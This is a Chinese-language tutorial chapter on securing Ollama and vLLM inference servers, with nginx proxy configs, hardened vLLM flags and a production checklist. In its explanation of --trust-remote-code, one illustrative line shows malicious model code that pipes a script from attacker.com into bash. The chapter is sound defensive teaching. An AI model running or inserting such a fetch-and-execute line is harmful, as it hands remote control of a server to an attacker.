# Ch 30 — vLLM / Ollama 部署安全

> **目標**：能評估 vLLM 和 Ollama 的安全設定，理解 inference server 的攻擊面，正確配置 production 部署。
>
> **環境**：Docker 24+, Ubuntu 22.04, Ollama 0.4+, vLLM 0.6+, nginx

---

## 為什麼需要這個？

Ch 28-29 處理了 container 和 orchestration 層的安全。但 container 裡面跑的 inference server 本身也有攻擊面。

Ollama 和 vLLM 是目前最流行的開源 LLM inference server。Ollama 主打簡單（`ollama run llama3.2`），vLLM 主打效能（PagedAttention、continuous batching）。但兩者在安全設計上有明顯缺陷：

- **Ollama**：沒有內建 auth。預設綁 `0.0.0.0:11434`。API 完全開放——任何能連到這個 port 的人都能推理、拉 model、甚至刪 model
- **vLLM**：有 `--api-key` 但很多教程忽略它。`--trust-remote-code` 這個 flag 允許執行 model repo 裡的任意 Python code——等於允許 RCE（Remote Code Execution，遠端程式碼執行）

這一章拆解兩者的攻擊面，教你做 production-grade 的安全配置。

---

## 先建立直覺

Inference server 就是一個 HTTP API server，只是後端是 LLM 而不是資料庫。用 web 安全框架思考：

| Web API | Inference Server | 差異 |
|---------|-----------------|------|
| Auth（API key/JWT） | Ollama: 無 / vLLM: `--api-key` | Ollama 完全沒有 auth |
| Input validation（SQLi/XSS） | Prompt injection / 超長 prompt → OOM | 新型 injection |
| Authorization（RBAC） | 誰能 pull/刪 model？ | 粗粒度 |
| Rate limiting | GPU 是稀缺資源，一個重 prompt 佔滿 GPU | 成本更高 |
| Logging | Prompt log 含隱私——保留多久？誰能看？ | GDPR 風險 |
| Code execution（通常不允許） | `--trust-remote-code` 允許任意 Python | 最大差異 |

---

## 核心概念：Ollama 的安全設定

### Ollama 的問題清單

Ollama 的設計哲學是「開發者友好」。這意味著安全不是預設值：

| 設定 | 預設值 | 問題 |
|------|--------|------|
| `OLLAMA_HOST` | `0.0.0.0:11434` | 監聽所有介面，含公網 |
| `OLLAMA_ORIGINS` | `*`（全部允許） | 任何網頁都能跨域呼叫 |
| Authentication | 無 | 任何人都能呼叫 API |
| TLS | 無（HTTP） | 明文傳輸 prompt 和回覆 |
| Rate limiting | 無 | 一個使用者可以佔滿 GPU |
| Model management | 任何人可以 pull/delete | 攻擊者可以刪光你的 model |

### 範例一：Ollama + nginx Reverse Proxy + Basic Auth

因為 Ollama 沒有內建 auth，我們在前面放一個 nginx reverse proxy 來處理認證、TLS、rate limiting。

nginx 設定：

```nginx
# /etc/nginx/conf.d/ollama-proxy.conf
upstream ollama_backend {
    server 127.0.0.1:11434;
}

server {
    listen 443 ssl;
    server_name llm.company.com;

    # --- TLS ---
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # --- Basic Auth ---
    auth_basic "LLM Inference API";
    auth_basic_user_file /etc/nginx/.htpasswd;

    # --- Rate Limiting ---
    limit_req_zone $binary_remote_addr zone=llm_limit:10m rate=10r/m;

    # --- Request Size Limit（防超長 prompt）---
    client_max_body_size 1m;

    # --- 只允許特定 endpoint ---
    # 允許 inference
    location /api/generate {
        limit_req zone=llm_limit burst=5 nodelay;
        proxy_pass http://ollama_backend;
        proxy_set_header Host $host;
        proxy_read_timeout 300s;  # LLM 生成可能很慢
    }

    location /api/chat {
        limit_req zone=llm_limit burst=5 nodelay;
        proxy_pass http://ollama_backend;
        proxy_set_header Host $host;
        proxy_read_timeout 300s;
    }

    # 允許列出 model（read-only）
    location /api/tags {
        proxy_pass http://ollama_backend;
    }

    # 封鎖 model 管理 endpoint
    location /api/pull {
        return 403 "Model management disabled";
    }
    location /api/delete {
        return 403 "Model management disabled";
    }
    location /api/push {
        return 403 "Model management disabled";
    }

    # 封鎖所有其他路徑
    location / {
        return 404;
    }

    # --- Logging（注意：不要 log request body，裡面有 prompt）---
    access_log /var/log/nginx/ollama-access.log;
    error_log /var/log/nginx/ollama-error.log;
}
```

建立密碼檔和啟動：

```bash
# 建立 htpasswd 檔案
sudo apt-get install -y apache2-utils
sudo htpasswd -c /etc/nginx/.htpasswd api-user

# 啟動 Ollama 只綁 loopback
OLLAMA_HOST=127.0.0.1:11434 ollama serve &

# 啟動 nginx
sudo nginx -t && sudo systemctl restart nginx

# 測試（需要 auth）
curl -u api-user:password https://llm.company.com/api/tags

# 沒有 auth 會被拒絕
curl https://llm.company.com/api/tags
# → 401 Authorization Required

# model 管理被封鎖
curl -u api-user:password -X POST https://llm.company.com/api/pull \
  -d '{"name": "llama3.2"}'
# → 403 Model management disabled
```

---

## 底層機制：`--trust-remote-code` 為什麼危險

vLLM 和 Hugging Face Transformers 都有一個 `--trust-remote-code` flag。它的作用是：允許從 model repository 下載並執行自訂的 Python code。

Hugging Face model repo 的結構：

```
some-model/
├── config.json           ← model 設定
├── tokenizer.json        ← tokenizer 設定
├── model.safetensors     ← model weights（安全格式）
├── modeling_custom.py    ← 自訂 Python code ← 這裡是問題
└── README.md
```

`modeling_custom.py` 可以包含任意 Python code。當你用 `--trust-remote-code` 載入這個 model，vLLM 會 `import` 這個 .py 檔——等於執行攻擊者寫的 Python code。

```
正常 model loading（不加 --trust-remote-code）：
  1. 下載 config.json → 解析 JSON ✓
  2. 下載 model.safetensors → 載入 tensor ✓
  3. 看到 modeling_custom.py → 忽略（不執行） ✓

加了 --trust-remote-code：
  1. 下載 config.json → 解析 JSON ✓
  2. 下載 model.safetensors → 載入 tensor ✓
  3. 下載 modeling_custom.py → import → 執行任意 code ✗
     │
     ▼
  攻擊者可以在 modeling_custom.py 裡放：
  ┌─────────────────────────────────────┐
  │  import os                          │
  │  os.system("curl attacker.com/sh   │
  │    | bash")                         │
  │  # reverse shell、挖礦、偷資料     │
  │  # 在 model loading 的瞬間執行     │
  │  # server admin 看不到異常          │
  │  # 因為 model 載入後正常運作       │
  └─────────────────────────────────────┘
```

很多教程和 HuggingFace model card 上都寫「請加 `--trust-remote-code`」。某些模型架構（如 Qwen、ChatGLM）確實需要自訂 code 才能載入——但這不代表你該無條件信任。載入前至少要做：

1. 檢查 model repo 的 `modeling_*.py` 內容
2. 確認 model 來源（官方 org vs 隨機使用者）
3. 在沙箱環境裡先測試

---

## 進一步用法：vLLM 的安全啟動

### 範例二：vLLM Production 配置

不安全的啟動（常見於教程）：

```bash
# 不安全：沒有 auth、信任 remote code、綁 0.0.0.0
python -m vllm.entrypoints.openai.api_server \
  --model meta-llama/Llama-3.2-3B-Instruct \
  --trust-remote-code \
  --host 0.0.0.0 \
  --port 8000
```

加固版本：

```bash
# 加固：有 auth、禁止 remote code、限制資源
python -m vllm.entrypoints.openai.api_server \
  --model meta-llama/Llama-3.2-3B-Instruct \
  --host 127.0.0.1 \
  --port 8000 \
  --api-key "${VLLM_API_KEY}" \
  --max-model-len 4096 \
  --max-num-seqs 32 \
  --gpu-memory-utilization 0.85 \
  --disable-log-requests \
  --served-model-name "llama-3.2" \
  --response-role "assistant"
  # 注意：沒有 --trust-remote-code
```

每個 flag 的安全意義：

| Flag | 作用 |
|------|------|
| `--api-key` | 強制 Bearer token auth |
| `--host 127.0.0.1` | 只接受本機連線 |
| `--max-model-len 4096` | 限制 context window，防止超長 prompt 吃光 GPU memory |
| `--max-num-seqs 32` | 限制同時處理的 request 數量 |
| `--gpu-memory-utilization 0.85` | 不佔滿 GPU memory，留 buffer 防 OOM |
| `--disable-log-requests` | 不記錄 prompt 內容（含隱私資料） |
| `--served-model-name "llama-3.2"` | 用別名，不洩漏內部 model path |
| 沒有 `--trust-remote-code` | 不執行 model repo 裡的 Python code |

用加固版 vLLM 打 API：

```bash
# 有 API key 才能存取
curl http://127.0.0.1:8000/v1/chat/completions \
  -H "Authorization: Bearer ${VLLM_API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "model": "llama-3.2",
    "messages": [{"role": "user", "content": "Hello"}]
  }'

# 沒有 API key → 401
curl http://127.0.0.1:8000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{"model": "llama-3.2", "messages": [{"role": "user", "content": "Hello"}]}'
# → {"error": "Unauthorized"}
```

### Production Checklist

```
Inference Server Production 安全檢查清單：

Auth
  □ API key 或 OAuth2 token 驗證
  □ API key 從 Secret Manager 取得（不 hardcode）
  □ 定期 rotate API key

Network
  □ Server 只綁 127.0.0.1（前面放 reverse proxy）
  □ Reverse proxy 負責 TLS termination
  □ Reverse proxy 做 rate limiting

Resource
  □ GPU memory utilization 設上限（≤ 0.9）
  □ Max concurrent requests 設上限
  □ Max context length 設上限
  □ Request timeout 設上限

Logging
  □ 記錄 request metadata（IP、timestamp、model、token count）
  □ 不記錄 prompt 內容（隱私）
  □ Log 保留期限符合合規要求

Model Loading
  □ 禁止 --trust-remote-code
  □ Model 從 trusted registry 載入
  □ Model 檔案做 checksum 驗證

API Surface
  □ 封鎖 model 管理 endpoint（pull/delete/push）
  □ /v1/models endpoint 不洩漏內部路徑
  □ 錯誤回應不洩漏 stack trace
```

---

## 對比與取捨

| 面向 | Ollama | vLLM | TGI（Text Generation Inference） |
|------|--------|------|----------------------------------|
| **內建 Auth** | 無 | `--api-key` | 無（需 proxy） |
| **TLS 支援** | 無 | 無 | 無 |
| **Rate Limiting** | 無 | 無原生支援 | 有（`--max-concurrent-requests`） |
| **trust-remote-code** | 不適用（Ollama 格式） | 有（危險） | 有（危險） |
| **Model 格式** | GGUF（Ollama 專用） | HF Transformers / GGUF | HF Transformers |
| **GPU 效能** | 中（llama.cpp backend） | 高（PagedAttention） | 高（Flash Attention） |
| **部署複雜度** | 低（一個 binary） | 中（需要 Python 環境） | 中（Docker 為主） |
| **OpenAI 相容 API** | 是 | 是 | 是 |
| **Multi-GPU** | 有限 | Tensor Parallelism | Tensor Parallelism |
| **適用場景** | 開發、小型部署 | 高效能生產環境 | 高效能生產環境 |
| **安全加固難度** | 需要 reverse proxy 補 auth | 內建 auth 但要停 trust-remote-code | 需要 proxy 補 auth |

選擇建議：

- **開發和測試**：Ollama，但限制綁 `127.0.0.1`
- **生產環境、效能優先**：vLLM + nginx proxy + API key
- **不想管 Python 環境**：TGI Docker image + proxy

---

## 踩雷集錦

**1. Ollama 預設不加密通訊**

Ollama 只支援 HTTP。使用者的 prompt 和 LLM 的回覆以明文在網路上傳輸。在同一網段的攻擊者用 tcpdump 就能擷取所有對話內容。必須在 Ollama 前面放 nginx/caddy 做 TLS termination。

**2. vLLM 的 `--trust-remote-code` 在很多教程被推薦開啟**

Qwen、ChatGLM、InternLM 等中國開源模型的 model card 幾乎都寫「需要 `--trust-remote-code`」。因為它們的模型架構用了自訂 attention implementation 或 tokenizer。但這意味著你在 import 這些 repo 裡的 Python code——如果 model repo 被入侵或替換，你的 inference server 會執行惡意 code。替代方案：用 GGUF 格式的量化版本（不需要 trust-remote-code），或在隔離環境裡手動 review code 後再部署。

**3. `/v1/models` endpoint 可能洩漏部署資訊**

vLLM 的 OpenAI-compatible API 有一個 `/v1/models` endpoint，回傳你載入的 model 名稱和路徑。如果你沒用 `--served-model-name` 覆蓋，它會回傳完整的 HuggingFace model ID（如 `meta-llama/Llama-3.2-3B-Instruct`）。攻擊者知道你用什麼 model 後，可以針對該 model 的已知弱點做攻擊。用 `--served-model-name` 設一個不洩漏資訊的別名。

**4. GPU memory 不夠時 vLLM 不是 graceful degradation**

vLLM 用 `--gpu-memory-utilization` 在啟動時預分配 GPU memory（PagedAttention 的 KV cache）。如果推理過程中 memory 不夠（例如太多 concurrent requests），vLLM 會直接 OOM kill——不是排隊等待、不是回 503、而是整個 process crash。設 `--gpu-memory-utilization` 到 0.85 而非 1.0，並用 `--max-num-seqs` 限制同時處理的 request 數量。

**5. Ollama 的 `/api/show` 洩漏 system prompt**

Ollama 的 `/api/show` endpoint 會回傳 model 的 Modelfile 內容，包含 `SYSTEM` 指令裡設定的 system prompt。如果你在 system prompt 裡寫了業務邏輯或安全規則，攻擊者 `curl /api/show -d '{"name":"llama3.2"}'` 就能看到。在 proxy 層封鎖這個 endpoint。

---

## 進階

### Prompt Logging 的隱私困境

你想記錄使用者的 prompt 以便 debug 和 audit。但 prompt 裡可能包含 PII（Personally Identifiable Information，個人識別資訊）——姓名、email、身分證號碼。

GDPR（General Data Protection Regulation，歐盟通用資料保護規範）要求你有明確的法律基礎才能處理 PII。如果你把 prompt log 留了 90 天，裡面有歐盟使用者的 PII，你可能違反 GDPR。

折衷方案：

1. **不記錄 prompt 內容**：只記錄 metadata（timestamp、user ID、token count、latency）
2. **記錄但做 PII masking**：用 Ch 21 的 Presidio 在寫 log 之前先遮蔽 PII
3. **短期保留 + 加密**：prompt log 保留 7 天後自動刪除，存放在加密的 storage 裡

### mTLS（Mutual TLS）做 Service-to-Service Auth

如果你的架構是 `API Gateway → Inference Server`，光靠 API key 不夠——API key 可能被中間人攫取。mTLS 讓雙方都驗證對方的 certificate：

```
API Gateway                        Inference Server
    │                                    │
    │  1. 出示自己的 client cert         │
    ├───────────────────────────────────→│
    │                                    │ 2. 驗證 client cert
    │  3. 驗證 server cert               │    （確認是合法的 gateway）
    │←───────────────────────────────────┤
    │                                    │
    │  4. 建立加密通道                    │
    │←══════════════════════════════════→│
    │  5. 傳送 inference request          │
    ├───────────────────────────────────→│
```

在 K8s 環境裡，用 Istio 或 Linkerd service mesh 可以自動處理 mTLS，不需要改 application code。

---

## 動手練習

1. **Ollama 攻擊面測試**：啟動 Ollama（預設設定），用 curl 測試所有 endpoint（`/api/tags`、`/api/generate`、`/api/pull`、`/api/delete`、`/api/show`）。記錄哪些 endpoint 不需要 auth 就能存取，以及各自的風險。

2. **nginx Reverse Proxy 設定**：用上面的 nginx 設定為 Ollama 加上 Basic Auth 和 rate limiting。驗證：(a) 無 auth 被拒絕、(b) 有 auth 可以 inference、(c) 超過 rate limit 被擋、(d) model 管理 endpoint 被封鎖。

3. **vLLM API key 測試**：用 `--api-key` 啟動 vLLM（如果沒有 GPU，用 `--device cpu` 跑小模型）。驗證沒有 API key 的 request 被拒絕。嘗試存取 `/v1/models`，觀察是否洩漏 model 路徑。

4. **trust-remote-code 審查**：到 HuggingFace 找一個要求 `--trust-remote-code` 的 model（如 Qwen2），下載它的 `modeling_*.py`，閱讀 code 並標記你認為可能有風險的地方。

---

## 重點整理

- Inference server 的攻擊面和 web API 相似：auth、input validation、rate limiting、logging。但多了 model loading 的 code execution 風險。
- Ollama 沒有內建 auth、TLS、rate limiting——必須在前面放 reverse proxy 補齊。
- vLLM 有 `--api-key` 但太多教程忽略它。`--trust-remote-code` 允許執行 model repo 裡的任意 Python code，是最大的安全風險。
- `/v1/models` 和 `/api/show` 等 endpoint 可能洩漏部署資訊和 system prompt——在 proxy 層封鎖。
- Prompt logging 有隱私問題——不記錄內容或做 PII masking。
- Production checklist：auth + TLS + rate limit + resource limit + logging + 封鎖管理 endpoint + 禁 trust-remote-code。

---

## 自我檢核

- 解釋 `--trust-remote-code` 的作用和風險。為什麼某些模型需要它？有什麼替代方案？
- Ollama 預設暴露哪些 endpoint？各自的風險是什麼？
- 你的 LLM inference server 需要記錄 prompt 內容嗎？如果記錄，GDPR 要求你做什麼？
- vLLM 的 `--gpu-memory-utilization` 設太高會發生什麼？設太低呢？
- 比較 Ollama、vLLM、TGI 的安全功能。如果你是要上線的生產環境，你選哪一個？為什麼？

---

## 延伸閱讀

### 官方文件

- **[Ollama FAQ — Security](https://github.com/ollama/ollama/blob/main/docs/faq.md)**
  - **讀哪裡**：Security 和 Networking 段落
  - **學什麼**：Ollama 官方對安全問題的回應和建議設定

- **[vLLM Documentation](https://docs.vllm.ai/en/latest/)**
  - **讀哪裡**：Serving → Engine Arguments 段落，特別是 `--api-key` 和 `--trust-remote-code`
  - **學什麼**：vLLM 的所有安全相關 flag

### 部落格

- **[Securing LLM Inference Endpoints](https://developer.nvidia.com/blog/securing-llm-inference-endpoints/)**（NVIDIA Blog）
  - **讀哪裡**：全文——涵蓋 auth、network isolation、monitoring
  - **學什麼**：NVIDIA 推薦的 inference server 安全架構

### 工具

- **[Caddy](https://caddyserver.com/)**
  - 自動 HTTPS 的 reverse proxy，比 nginx 設定更簡潔
  - 如果你覺得 nginx 設定太繁瑣，Caddy 兩行搞定 reverse proxy + TLS
